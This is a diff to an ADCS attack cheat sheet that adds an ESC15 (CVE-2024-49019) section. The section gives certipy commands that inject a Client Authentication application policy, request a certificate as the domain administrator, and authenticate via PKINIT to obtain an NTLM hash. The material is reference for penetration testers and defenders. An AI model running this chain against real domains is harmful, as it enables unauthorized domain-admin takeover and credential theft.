@@ -1,4 +1,4 @@
-# ADCS Certificate Abuse — ESC1-8 Attack Chains
+# ADCS Certificate Abuse — ESC1-15 Attack Chains
 
 ---
 
@@ -269,6 +269,28 @@ certipy req -u user@domain.local -p pass -ca '<CA>' -template '<ESC13-Template>'
 # Authenticate — certificate grants group membership through issuance policy
 certipy auth -pfx user.pfx -domain domain.local -username user -dc-ip <dc_ip>
 ```
+
+---
+
+## ESC15 — EKUwu / Application Policy Injection (CVE-2024-49019)
+
+Schema Version 1 templates with `ENROLLEE_SUPPLIES_SUBJECT` allow the enrollee to smuggle application policies into the CSR. The CA copies them into the issued cert, and Windows PKI prefers Application Policies over the template's EKU list — so a template with only `Server Authentication` (or any non-client-auth) EKU can yield a `Client Authentication` cert usable for PKINIT.
+
+**Requirements**: enrollment on a schema v1 template with `ENROLLEE_SUPPLIES_SUBJECT`. Patched by Microsoft on 2024-11-12; unpatched DCs remain vulnerable.
+
+```bash
+# Identify (certipy tags ESC15 explicitly)
+certipy find -u user@domain.local -p pass -dc-ip <dc_ip> -vulnerable -stdout | grep -A5 ESC15
+
+# Request with injected Client Authentication application policy
+certipy req -u user@domain.local -p pass -ca '<CA>' -template '<v1-template>' \
+  -upn administrator@domain.local -application-policies 'Client Authentication' -dc-ip <dc_ip>
+
+# Authenticate (PKINIT) → NTLM hash
+certipy auth -pfx administrator.pfx -domain domain.local -username administrator -dc-ip <dc_ip>
+```
+
+Other useful `-application-policies` values: `Certificate Request Agent` (chain into ESC3), `Code Signing`.
 
 ---
 
